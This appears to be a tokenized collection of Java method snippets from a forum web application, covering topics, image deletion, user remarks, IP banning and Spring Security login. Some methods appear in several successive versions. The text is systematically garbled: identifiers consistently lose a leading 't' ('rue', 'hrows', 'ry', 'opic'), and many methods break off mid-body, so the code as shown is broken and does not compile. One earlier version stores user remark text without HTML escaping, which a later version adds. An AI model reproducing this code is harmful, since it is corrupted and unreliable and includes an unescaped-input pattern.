public boolean isImagePostingAllowed ( @Nonnull Section section , @Nullable User currentUser ) { if ( section . isImagepost ( ) ) { return rue ; } if ( currentUser ! = null & & currentUser . isAdministrator ( ) ) { return section . isImageAllowed ( ) ; } return false ; } 
private void prepareModel ( AddTopicRequest form , Map < String , Object > params , User currentUser ) { Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " opTags " , agService . getTopTags ( ) ) ; } 
public void addTag ( int userId , int agId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " ag_id " , agId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; ry { jdbcTemplate . update ( 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , ag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
public Image imageForTopic ( @Nonnull Topic opic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , new ImageRowMapper ( ) , opic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public Image mapRow ( ResultSet rs , int i ) hrows SQLException { return new Image ( rs . getInt ( " id " ) , 
public boolean isEditable ( ) { return agsEditable | | opicEditable ; } 
public boolean isTopicEditable ( ) { return opicEditable ; } 
public boolean isTagsEditable ( ) { return agsEditable ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public ModelAndView deleteForm ( @RequestParam ( required = rue ) int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam ( required = rue ) int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; imageDao . deleteImage ( image ) ; return new RedirectView ( opic . getLinkLastmod ( ) ) ; } 
public Image imageForTopic ( @Nonnull Topic opic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , opic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public void deleteImage ( Image image ) { jdbcTemplate . update ( " UPDATE images SET deleted='true' WHERE id=? " , image . getId ( ) ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldimage ( resultSet . getInt ( " oldimage " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldimage ( null ) ; } editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
public RedirectView deleteImage ( @RequestParam ( required = rue ) int id , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , request . isSecure ( ) , mpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , mpl . getCurrentUser ( ) ) ; imageService . deleteImage ( mpl . getCurrentUser ( ) , image ) ; return new RedirectView ( opic . getLinkLastmod ( ) ) ; } 
public void deleteImage ( User editor , Image image ) { EditHistoryDto info = new EditHistoryDto ( ) ; info . setEditor ( editor . getId ( ) ) ; info . setMsgid ( image . getTopicId ( ) ) ; info . setOldimage ( image . getId ( ) ) ; info . setObjectType ( EditHistoryObjectTypeEnum . TOPIC ) ; imageDao . deleteImage ( image ) ; editHistoryService . insert ( info ) ; } 
public Remark mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Remark ( resultSet ) ; } 
public void updateRemark ( int id , String ext ) { jdbcTemplate . update ( " UPDATE user_remarks SET remark_text=? WHERE id=? " , ext , id ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemarkClass ( mpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " rid " ) String rid , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , ext ) ; } else { userDao . setRemark ( user , refUser , ext ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , ext ) ; } else { userDao . setRemark ( user , refUser , ext ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ext = StringUtil . escapeHtml ( ext ) ; if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; Remark rm = userDao . getRemark ( user , refUser ) ; if ( rm ! = null ) { userDao . updateRemark ( rm . getId ( ) , ext ) ; } else { userDao . setRemark ( user , refUser , ext ) ; } return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_ANONYMOUS " ) ) ; } 
public static boolean isModeratorSession ( ) { return isSessionAuthorized ( ) & & hasAuthority ( " ROLE_MODERATOR " ) ; } 
public static boolean isCorrectorSession ( ) { return isSessionAuthorized ( ) & & hasAuthority ( " ROLE_CORRECTOR " ) ; } 
public static boolean isUsingDefaultProfile ( ) { return getCurrentProfile ( ) . isDefault ( ) ; } 
public LoginStatus loginAjax ( @RequestParam ( " nick " ) final String username , @RequestParam ( " passwd " ) final String password , HttpServletRequest request , HttpServletResponse response ) { UsernamePasswordAuthenticationToken oken = new UsernamePasswordAuthenticationToken ( username , password ) ; ry { UserDetailsImpl details = ( UserDetailsImpl ) userDetailsService . loadUserByUsername ( username ) ; 
public boolean isLoggedIn ( ) { return success ; } 
public String encodePassword ( String rawPass , Object salt ) { return encryptor . encryptPassword ( rawPass ) ; } 
public boolean isPasswordValid ( String encPass , String rawPass , Object salt ) { return encryptor . checkPassword ( rawPass , encPass ) ; } 
public void doFilter ( ServletRequest req , ServletResponse res , FilterChain chain ) hrows IOException , ServletException { WebApplicationContext ctx = WebApplicationContextUtils . getWebApplicationContext ( getServletContext ( ) ) ; HttpServletRequest request = ( HttpServletRequest ) req ; request . getSession ( ) . setAttribute ( " configuration " , ctx . getBean ( Configuration . class ) ) ; request . getSession ( ) . setAttribute ( " emplate " , new Template ( ctx ) ) ; if ( AuthUtil . isSessionAuthorized ( ) ) { request . getSession ( ) . setAttribute ( " currentStyle " , AuthUtil . getCurrentUser ( ) . getStyle ( ) ) ; request . getSession ( ) . setAttribute ( " currentProfile " , AuthUtil . getCurrentProfile ( ) ) ; request . getSession ( ) . setAttribute ( " currentProperties " , AuthUtil . getProf ( ) ) ; forWikiManipulation ( request , ( HttpServletResponse ) res , AuthUtil . getAuthentication ( ) ) ; } else { request . getSession ( ) . setAttribute ( " currentStyle " , " ango " ) ; request . getSession ( ) . setAttribute ( " currentProfile " , Profile . getDefaultProfile ( ) ) ; request . getSession ( ) . setAttribute ( " currentProperties " , AuthUtil . getProf ( ) ) ; } CSRFManipulation ( request , ( HttpServletResponse ) res ) ; chain . doFilter ( req , res ) ; } 
private void CSRFManipulation ( HttpServletRequest request , HttpServletResponse response ) { Properties cookies = LorHttpUtils . getCookies ( request . getCookies ( ) ) ; if ( cookies . get ( CSRFProtectionService . CSRF_COOKIE ) = = null ) { CSRFProtectionService . generateCSRFCookie ( request , response ) ; } else { request . setAttribute ( CSRFProtectionService . CSRF_ATTRIBUTE , cookies . getProperty ( CSRFProtectionService . CSRF_COOKIE ) . rim ( ) ) ; } response . addHeader ( " Cache-Control " , " private " ) ; } 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response , Authentication authentication ) { HttpSession session = request . getSession ( ) ; AuthUtil . getCurrentUser ( ) . acegiSecurityHack ( response , session ) ; } 
public boolean isAccountNonExpired ( ) { return rue ; } 
public boolean isAccountNonLocked ( ) { return ! user . isBlocked ( ) & & user . isActivated ( ) ; } 
public boolean isCredentialsNonExpired ( ) { return rue ; } 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) & & user . isActivated ( ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , readProfile ( user . getNick ( ) ) , configuration ) ; } 
private Profile readProfile ( String username ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; ry { df = storage . getReadStream ( " profile " , username ) ; ObjectInputStream dof = null ; ry { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } finally { if ( dof ! = null ) { ry { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } } } } catch ( StorageException e ) { logger . info ( " Bad profile for user " + username ) ; } catch ( ClassNotFoundException e ) { logger . info ( " Bad profile for user " + username ) ; } finally { if ( df ! = null ) { ry { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + username ) ; } } } ProfileProperties properties ; if ( userProfile ! = null ) { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return new Profile ( properties , false ) ; } 
public boolean isSessionAuthorized ( ) { return AuthUtil . isSessionAuthorized ( ) ; } 
public boolean isModeratorSession ( ) { return AuthUtil . isModeratorSession ( ) ; } 
public boolean isCorrectorSession ( ) { return AuthUtil . isCorrectorSession ( ) ; } 
public void updateCurrentUser ( UserDao userDao ) { initCurrentUser ( rue ) ; } 
private void initCurrentUser ( boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } currentUser = AuthUtil . getCurrentUser ( ) ; } 
public void init ( ) { ry { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { hrow new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } ry { String mainHost = mainURI . getHost ( ) ; if ( mainHost = = null ) { hrow new RuntimeException ( ERR_MSG + " bad URI host " ) ; } } catch ( URIException e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } ry { secureURI = new URI ( properties . getProperty ( " SecureUrl " , mainURI . oString ( ) . replaceFirst ( " http " , " https " ) ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } MemCachedSettings . setMainUrl ( getMainUrl ( ) ) ; } 
public void checkBlockIP ( @Nonnull String addr , @Nonnull Errors errors , @Nullable User user ) hrows UnknownHostException , TextParseException { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
private IPBlockInfo loadIPBlock ( HttpServletRequest request ) { return ipBlockDao . getBlockInfo ( request . getRemoteAddr ( ) ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = mpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , " UTF-8 " ) ) ) ; } 
public void blockIP ( String ip , User moderator , String reason , Timestamp s , boolean allow_posting , boolean captcha_required ) { IPBlockInfo blockInfo = getBlockInfo ( ip ) ; if ( ! blockInfo . isInitialized ( ) ) { jdbcTemplate . update ( 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < PreparedRemark > ( list . size ( ) ) ; for ( Remark remark : list ) { ry { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } catch ( UserNotFoundException e ) { } } return remarksPrepared ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { Object principal = authentication . getPrincipal ( ) ; 
public void onAuthenticationSuccess ( HttpServletRequest request , HttpServletResponse response , Authentication authentication ) hrows IOException , ServletException { AuthUtil . updateLastLogin ( authentication , userDao ) ; super . onAuthenticationSuccess ( request , response , authentication ) ; } 
public void onAuthentication ( Authentication authentication , HttpServletRequest request , HttpServletResponse response ) { AuthUtil . updateLastLogin ( authentication , userDao ) ; super . onAuthentication ( authentication , request , response ) ; } 
public static boolean isSessionAuthorized ( ) { Authentication authentication = SecurityContextHolder . getContext ( ) . getAuthentication ( ) ; return authentication ! = null & & ( authentication . isAuthenticated ( ) & & ! hasAuthority ( " ROLE_SYSTEM_ANONYMOUS " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) hrows Exception { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < PreparedRemark > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public ModelAndView forumArchive ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return forum ( groupName , offset , false , request , response , year , month ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return forum ( groupName , offset , lastmod , request , response , null , null ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } if ( mpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( mpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 120000 ) ; return mv ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19390 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateMaxScore ( ) { jdbcTemplate . update ( " update users set max_score=score where score>max_score " ) ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { ry { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { 
private void forWikiManipulation ( HttpServletRequest request , HttpServletResponse response , Template emplate ) { HttpSession session = request . getSession ( ) ; User user = emplate . getCurrentUser ( ) ; if ( user ! = null ) { user . acegiSecurityHack ( response , session ) ; 
public boolean isAccountNonLocked ( ) { return nonLocked ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) ) ; } 
private void initCurrentUser ( boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = userDao . getUser ( AuthUtil . getNick ( ) ) ; 
